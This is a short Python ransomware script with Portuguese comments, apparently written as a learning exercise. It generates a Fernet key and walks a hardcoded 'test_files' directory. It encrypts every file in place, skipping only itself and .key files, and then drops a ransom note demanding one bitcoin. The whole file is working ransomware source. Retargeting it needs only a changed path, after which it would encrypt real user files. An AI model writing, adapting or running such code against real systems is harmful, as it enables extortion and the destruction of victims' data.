from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()


#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open (arquivo, "rb") as file:
        dados = file.read()
    dados_encriptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptografados)

#4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for name in arquivos:
            caminho = os.path.join(raiz, name)
            if name != "ransoware.py" and not name.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate
def criar_mensagem_regate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram encriptografados!\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

#6. Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_regate()
    print("Ransoware executado! Arquivos criptografados")

if __name__== "__main__":
    main()